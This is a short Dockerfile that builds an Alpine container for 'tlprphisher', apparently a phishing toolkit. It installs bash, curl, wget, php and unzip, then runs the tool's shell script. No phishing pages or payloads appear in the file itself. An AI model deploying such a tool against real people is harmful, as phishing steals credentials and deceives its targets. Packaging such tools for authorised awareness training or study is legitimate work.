FROM alpine:latest
LABEL MAINTAINER="https://github.com/sajadtlpr/tlprphisher"
WORKDIR /tlprphisher/
ADD . /tlprphisher
RUN apk add --no-cache bash ncurses curl unzip wget php 
CMD "./tlprphisher.sh"
